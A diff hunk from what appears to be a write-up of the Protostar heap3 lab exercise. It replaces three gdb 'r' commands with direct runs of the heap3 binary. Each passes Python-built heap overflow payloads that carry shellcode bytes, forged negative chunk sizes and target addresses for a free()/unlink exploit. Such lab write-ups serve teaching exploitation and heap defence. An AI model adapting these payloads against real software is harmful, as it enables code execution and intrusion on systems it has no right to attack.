@@ -326,11 +326,11 @@ How the free() function and algorithm works:
 
 - Final Answers:
 
-    `r $(python -c "print('A'*12+'\xb8\x64\x88\x04\x08\xff\xd0')") $(python -c "print('B'*36+'\x65')") $(python -c "print('C'*88+'D'*4+'\xfe\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08')")`
+    `/opt/protostar/bin/heap3 $(python -c "print('A'*12+'\xb8\x64\x88\x04\x08\xff\xd0')") $(python -c "print('B'*36+'\x65')") $(python -c "print('C'*88+'D'*4+'\xfe\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08')")`
 
-    `r $(python -c "print('A'*12+'\xb8\x64\x88\x04\x08\xff\xd0')") $(python -c "print('B'*36+'\x65')") $(python -c "print('C'*88+'D'*4+'\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08')")`
+    `/opt/protostar/bin/heap3 $(python -c "print('A'*12+'\xb8\x64\x88\x04\x08\xff\xd0')") $(python -c "print('B'*36+'\x65')") $(python -c "print('C'*88+'D'*4+'\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08')")`
 
-    `r $(python -c "print('A'*12+'\xb8\x64\x88\x04\x08\xff\xd0')") $(python -c "print('B'*36+'\x65')") $(python -c "print('C'*88+'D'*4+'\xcc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08')")`
+    `/opt/protostar/bin/heap3 $(python -c "print('A'*12+'\xb8\x64\x88\x04\x08\xff\xd0')") $(python -c "print('B'*36+'\x65')") $(python -c "print('C'*88+'D'*4+'\xcc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08')")`
 
     - The 4 bytes before the fffffffc fffffffc fd bk chunk can be anything as long as it does not contain null bytes
 
